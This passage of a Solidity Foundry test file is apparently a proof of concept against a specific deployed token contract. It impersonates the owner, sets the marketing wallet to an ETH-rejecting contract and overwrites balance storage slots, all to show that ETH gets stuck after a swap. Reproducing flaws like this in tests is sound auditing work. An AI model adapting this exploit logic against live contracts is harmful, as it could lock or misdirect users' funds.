}

contract RejectETH {
    fallback() external payable {
        revert("ETH rejected");
    }
    receive() external payable {
        revert("ETH rejected");
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xD8dBE5AC60cD1c0b40C9182cB3eB2392d3df371F;
    address attacker = address(this);
    IBossBaby target;
    RejectETH rejectingContract;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = IBossBaby(TARGET);
        rejectingContract = new RejectETH();

        address owner = target.owner();
        vm.startPrank(owner);
        target.changeMarketingWallet(address(rejectingContract));

        if (!target.tradingEnabled()) {
            target.enableTrading();
        }
        vm.stopPrank();

        deal(address(this), 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(TARGET).balance;
        console.log("Initial ETH balance:", initialBalance);

        uint256 swapThreshold = target.swapTokensAtAmount();
        console.log("Swap threshold:", swapThreshold);

        address pair = target.uniswapV2Pair();
        console.log("Pair:", pair);

        uint256 contractBalance = target.balanceOf(TARGET);
        console.log("Contract token balance:", contractBalance);

        // Give attacker tokens using storage manipulation
        bytes32 attackerSlot = keccak256(abi.encode(address(this), bytes32(uint256(1))));
        vm.store(TARGET, attackerSlot, bytes32(uint256(swapThreshold * 2)));

        bytes32 rOwnedSlot = keccak256(abi.encode(address(this), bytes32(uint256(0))));
        uint256 currentRate = 1e18;
        vm.store(TARGET, rOwnedSlot, bytes32(uint256(swapThreshold * 2 * currentRate)));

        // Mark attacker as not excluded from fees
        bytes32 excludedFromFeesSlot = keccak256(abi.encode(address(this), bytes32(uint256(2))));
        vm.store(TARGET, excludedFromFeesSlot, bytes32(uint256(0)));

        // Mark attacker as not excluded from rewards
        bytes32 excludedSlot = keccak256(abi.encode(address(this), bytes32(uint256(3))));
        vm.store(TARGET, excludedSlot, bytes32(uint256(0)));

        // Transfer from attacker to pair - triggers swapAndSendMarketing
        // The ETH swap will succeed but sendValue to RejectETH will return false
        vm.startPrank(address(this));
        try target.transfer(pair, swapThreshold) {
            // Transfer succeeded
        } catch (bytes memory) {
            // Transfer may have reverted due to ETH send failure
        }
        vm.stopPrank();

        uint256 finalBalance = address(TARGET).balance;
        console.log("Final ETH balance:", finalBalance);

        // ETH should be stuck because marketing wallet rejects payments
        // The balance should be greater than initial (from the swap) but not sent out
        assertGt(finalBalance, initialBalance, "ETH should be stuck in contract after swap");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
